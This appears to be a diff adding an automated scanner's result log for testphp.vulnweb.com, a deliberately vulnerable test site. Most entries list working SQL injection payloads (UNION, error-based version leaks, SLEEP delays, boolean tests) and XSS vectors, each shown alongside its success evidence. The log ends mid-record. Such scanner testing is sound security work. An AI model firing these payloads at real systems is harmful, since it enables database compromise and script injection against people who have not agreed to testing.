@@ -1,0 +1,2562 @@
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: ["' or 1=1 -- -;<img src=x>//", "' or 1>1 -- -;<img src=x>//"]
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Times: ['0.52s', '0.52s']
+Response_Lengths: [2277, 2280]
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: ["' or 1=1 -- -;<img src=x>//", "' or 1>1 -- -;<img src=x>//"]
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Times: ['0.52s', '0.52s']
+Response_Lengths: [2277, 2280]
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1);//'>
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.52s
+Response_Length: 2379
+Alert_Triggered: True
+Alert_Message: 1
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: alert_triggered
+payload: <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1);//'>
+Confidence: 70
+Evidence: JavaScript alert triggered
+Response_Time: 0.52s
+Response_Length: 2379
+Alert_Triggered: True
+Alert_Message: 1
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: ';}<h1>test</h1>//
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.50s
+Response_Length: 2351
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: html_injection
+payload: ';}<h1>test</h1>//
+Confidence: 50
+Evidence: HTML tag injected <h1>test</h1> 
+Response_Time: 0.50s
+Response_Length: 2351
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: reflected
+payload: ';}<h1>test</h1>//
+Confidence: 50
+Evidence: Payload reflected: ';}<h1>test</h1>//
+Response_Time: 0.50s
+Response_Length: 2351
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: '"<script>alert({{1234**3}})</script><!---
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.50s
+Response_Length: 2340
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: html_injection
+payload: '"<script>alert({{1234**3}})</script><!---
+Confidence: 50
+Evidence: HTML tag injected <script>alert({{1234**3}})</script> 
+Response_Time: 0.50s
+Response_Length: 2340
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: reflected
+payload: '"<script>alert({{1234**3}})</script><!---
+Confidence: 50
+Evidence: Payload reflected: '"<script>alert({{1234**3}})</script><!---
+Response_Time: 0.50s
+Response_Length: 2340
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: <img src=x onerror='javascript:alert(6)'>
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.51s
+Response_Length: 2379
+Alert_Triggered: True
+Alert_Message: 6
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: alert_triggered
+payload: <img src=x onerror='javascript:alert(6)'>
+Confidence: 70
+Evidence: JavaScript alert triggered
+Response_Time: 0.51s
+Response_Length: 2379
+Alert_Triggered: True
+Alert_Message: 6
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: <img src='a' alt="test" onload=javascript%3Aalert`6`>
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.50s
+Response_Length: 2367
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: /**/a';${1234**3};'--%20-
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.49s
+Response_Length: 2356
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: reflected
+payload: /*!SLEEP(5)/*/alert(1)/*/*/
+Confidence: 50
+Evidence: Payload reflected: /*!SLEEP(5)/*/alert(1)/*/*/
+Response_Time: 0.50s
+Response_Length: 4797
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: '"<script>#{1234**3};alert(1)</script><img src=x onerror=alert(2)><!--
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.49s
+Response_Length: 2330
+Alert_Triggered: True
+Alert_Message: 2
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: alert_triggered
+payload: '"<script>#{1234**3};alert(1)</script><img src=x onerror=alert(2)><!--
+Confidence: 70
+Evidence: JavaScript alert triggered
+Response_Time: 0.49s
+Response_Length: 2330
+Alert_Triggered: True
+Alert_Message: 2
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: html_injection
+payload: '"<script>#{1234**3};alert(1)</script><img src=x onerror=alert(2)><!--
+Confidence: 50
+Evidence: HTML tag injected <script>#{1234**3};alert(1)</script> 
+Response_Time: 0.49s
+Response_Length: 2330
+Alert_Triggered: True
+Alert_Message: 2
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: " onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.23s
+Response_Length: 2393
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: '"><iframe onload=alert('{{1234**3}}');>
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.24s
+Response_Length: 2362
+Alert_Triggered: True
+Alert_Message: {{1234**3}}
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: alert_triggered
+payload: '"><iframe onload=alert('{{1234**3}}');>
+Confidence: 70
+Evidence: JavaScript alert triggered
+Response_Time: 0.24s
+Response_Length: 2362
+Alert_Triggered: True
+Alert_Message: {{1234**3}}
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Pattern_Type: html_injection
+payload: '"><iframe onload=alert('{{1234**3}}');>
+Confidence: 50
+Evidence: HTML tag injected <iframe onload=alert('{{1234**3}}');> 
+Response_Time: 0.24s
+Response_Length: 2362
+Alert_Triggered: True
+Alert_Message: {{1234**3}}
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: ' OR WAITFOR DELAY "00:00:05"-- 
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.35s
+Response_Length: 2321
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: ' AND SLEEP(5)/*
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.34s
+Response_Length: 2287
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: time_delay
+payload: SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
+Confidence: 60
+Evidence: Response delayed 10.73s
+Response_Time: 10.73s
+Response_Length: 0
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: "' AND IF(1=1,SLEEP(5),0)--
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.16s
+Response_Length: 2280
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: ' || BEGIN DBMS_SESSION.SLEEP(5); END; -- 
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.17s
+Response_Length: 2331
+------------------------------------------------------------------
+
+
+handler: common
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Pattern_Type: error
+payload: ' || BEGIN DBMS_SESSION.SLEEP(5); END; -- 
+Confidence: 70
+Evidence: SQL error detected (MySQL)
+Response_Time: 0.17s
+Response_Length: 2331
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' UNION SELECT NULL-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' ORDER BY -1-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' AND cast(version() as integer) > 0-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' UNION SELECT sqlite_version()-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' AND 1=convert(int,@@version)-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' + convert(int,@@version) + '
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Error-Based SQL Injection
+payload: ' UNION SELECT NULL FROM DUAL-- -
+Confidence: 100
+Evidence: Error message observed in response DBMS: None 
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Time-Based SQL Injection
+payload: '/**/or/**/sleep(5)/**/--/**/-
+Confidence: 100
+Evidence: Avg Response Time: 10.66s DBMS: None
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Boolean-Based SQL Injection
+payload: '); or 1=1 -- -
+Confidence: 100
+Evidence: Shows a significant difference from normal input DBMS: None
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Boolean-Based SQL Injection
+payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Confidence: 100
+Evidence: Shows a significant difference from normal input DBMS: None
+------------------------------------------------------------------
+
+
+handler: advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Detail_Vuln: Boolean-Based SQL Injection
+payload: ' AND IIF(1=1,1,0)--
+Confidence: 100
+Evidence: Shows a significant difference from normal input DBMS: None
+------------------------------------------------------------------
+
+
+Final Arrange Result
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: ["' or 1=1 -- -;<img src=x>//", "' or 1>1 -- -;<img src=x>//"]
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: ["' or 1=1 -- -;<img src=x>//", "' or 1>1 -- -;<img src=x>//"]
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: sql_injection
+Detected: True
+Common_payload: <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1);//'>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND extractvalue(rand(),concat(char(126),version(),char(126)))-- -
+Advanced_Confidence: 100
+Context: r(126)))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)-- -
+Advanced_Confidence: 100
+Context: )) as x)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND cast(version() as integer) > 0-- -
+Advanced_Confidence: 100
+Context: ger) > 0-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast(chr(126)||version()||chr(126) AS NUMERIC)-- -
+Advanced_Confidence: 100
+Context: NUMERIC)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT sqlite_version()-- -
+Advanced_Confidence: 100
+Context: ersion()-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=convert(int,@@version)-- -
+Advanced_Confidence: 100
+Context: version)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND 1=cast((SELECT @@version) as int)-- -
+Advanced_Confidence: 100
+Context:  as int)-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' + convert(int,@@version) + '
+Advanced_Confidence: 100
+Context: version) + '</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL FROM DUAL-- -
+Advanced_Confidence: 100
+Context: ROM DUAL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Time-Based SQL Injection
+Advanced_payload: '/**/or/**/sleep(5)/**/--/**/-
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: '); or 1=1 -- -
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' OR (SELECT CASE WHEN (1=1) THEN 'true' ELSE 'false' END) = 'true'--
+Advanced_Confidence: 100
+Detail_Vuln: Boolean-Based SQL Injection
+Advanced_payload: ' AND IIF(1=1,1,0)--
+Advanced_Confidence: 100
+------------------------------------------------------------------
+
+handler: common, advanced
+url: http://testphp.vulnweb.com/listproducts.php
+parameters: ['test', 'searchFor']
+method: GET
+Type: xss
+Detected: True
+Common_payload: <svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1);//'>
+Common_Confidence: 70
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' UNION SELECT NULL-- -
+Advanced_Confidence: 100
+Context: ECT NULL-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' ORDER BY -1-- -
+Advanced_Confidence: 100
+Context: ER BY -1-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
+Advanced_payload: ' AND updatexml(NULL, concat(char(126),version()), char(126))-- -
+Advanced_Confidence: 100
+Context: ar(126))-- -</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '
+Detail_Vuln: Error-Based SQL Injection
